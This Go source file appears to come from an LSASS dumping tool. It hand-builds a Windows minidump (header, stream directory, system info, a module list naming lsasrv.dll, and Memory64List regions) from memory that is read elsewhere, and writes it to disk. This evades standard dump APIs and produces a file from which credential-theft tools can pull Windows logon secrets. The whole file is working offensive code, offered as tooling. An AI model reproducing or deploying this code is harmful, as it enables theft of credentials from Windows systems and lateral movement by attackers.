package mini

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"godump/win"
	"os"
	"unicode/utf16"
	"unsafe"
)

const (
	sizeOfUintPtr = unsafe.Sizeof(uintptr(0))
)

func joinByteArrays(arrays ...[]byte) []byte {
	var result []byte
	for _, array := range arrays {
		result = append(result, array...)
	}
	return result
}

func structToByteArray[T any](structInstance T) []byte {
	structSize := int(unsafe.Sizeof(structInstance))
	byteArray := make([]byte, structSize)
	ptr := unsafe.Pointer(&structInstance)
	copy(byteArray, (*[1 << 30]byte)(ptr)[:structSize])
	return byteArray
}

func newCustomUnicodeString(str string) win.CUSTOM_UNICODE_STRING {
	var cus win.CUSTOM_UNICODE_STRING
	runes := utf16.Encode([]rune(str))
	cus.Length = uint32(len(runes) * 2)
	for i, r := range runes {
		if i >= 31 {
			break
		}
		cus.Buffer[i] = r
	}
	return cus
}

func uintptrToBytes(u *uintptr) []byte {
	return (*[sizeOfUintPtr]byte)(unsafe.Pointer(u))[:]
}

func structToByteArray1(v any) []byte {
	buf := new(bytes.Buffer)
	err := binary.Write(buf, binary.LittleEndian, v)
	if err != nil {
		fmt.Println("binary.Write failed:", err)
	}
	return buf.Bytes()
}

func Createdump(lsasrvdllAddress uintptr, lsasrvdllSize int, mem64infoList []win.Memory64Info, memoryRegionsByteArr []byte, dumpfile string) {
	// Header
	header := win.MinidumpHeader{
		Signature:          0x504d444d,
		Version:            0xa793,
		NumberOfStreams:    0x3,
		StreamDirectoryRva: 0x20,
	}

	// Stream Directory
	minidumpStreamDirectoryEntry1 := win.MinidumpStreamDirectoryEntry{
		StreamType: 4,
		Size:       112,
		Location:   0x7c,
	}
	minidumpStreamDirectoryEntry2 := win.MinidumpStreamDirectoryEntry{
		StreamType: 7,
		Size:       56,
		Location:   0x44,
	}
	minidumpStreamDirectoryEntry3 := win.MinidumpStreamDirectoryEntry{
		StreamType: 9,
		Size:       uint32(16 + 16*len(mem64infoList)),
		Location:   0x12A,
	}

	// SystemInfoStream
	osVersionInfo := win.GetBuildNumber()
	systemInfoStream := win.SystemInfoStream{
		ProcessorArchitecture: 0x9,
		MajorVersion:          osVersionInfo.DwMajorVersion,
		MinorVersion:          osVersionInfo.DwMinorVersion,
		BuildNumber:           osVersionInfo.DwBuildNumber,
	}

	// ModuleList
	b := uintptrToBytes(&lsasrvdllAddress)
	moduleListStream := win.ModuleListStream{
		NumberOfModules: uint32(1),
		BaseAddress:     [8]byte{b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]},
		Size:            uint32(lsasrvdllSize),
		PointerName:     0xE8,
	}

	dll_str := "C:\\Windows\\System32\\lsasrv.dll"
	var dllName = newCustomUnicodeString(dll_str)

	// Memory64List
	numberOfEntries := uint64(len(mem64infoList))
	offsetMemRegions := 0x12A + 16 + (16 * len(mem64infoList))
	memory64ListStream := win.Memory64ListStream{
		NumberOfEntries:       numberOfEntries,
		MemoryRegionsBaseAddr: uint32(offsetMemRegions),
	}

	memory64ListStream_byte_arr := structToByteArray(memory64ListStream)
	i := 0
	for i < len(mem64infoList) {
		memory64Info := mem64infoList[i]
		memory64ListStream_byte_arr = joinByteArrays(memory64ListStream_byte_arr, structToByteArray(memory64Info))
		i++
	}

	headerByteArray := structToByteArray(header)
	streamDirectoryByteArray := joinByteArrays(structToByteArray(minidumpStreamDirectoryEntry1), structToByteArray(minidumpStreamDirectoryEntry2), structToByteArray(minidumpStreamDirectoryEntry3))
	systemInfoStreamByteArray := structToByteArray(systemInfoStream)
	moduleListStreamByteArray := joinByteArrays(structToByteArray(moduleListStream), structToByteArray1(dllName))
	minidumpFile := joinByteArrays(headerByteArray, streamDirectoryByteArray, systemInfoStreamByteArray, moduleListStreamByteArray, memory64ListStream_byte_arr, memoryRegionsByteArr)

	// Save to file
	file, err := os.Create(dumpfile)
	if err != nil {
		fmt.Println("It was not possible to create the file. Error:", err)
		return
	}
	defer file.Close()

	_, err = file.Write(minidumpFile)
	if err != nil {
		fmt.Println("It was not possible to write to the file. Error:", err)
		return
	}

	fmt.Println("File", dumpfile, "created.")
}
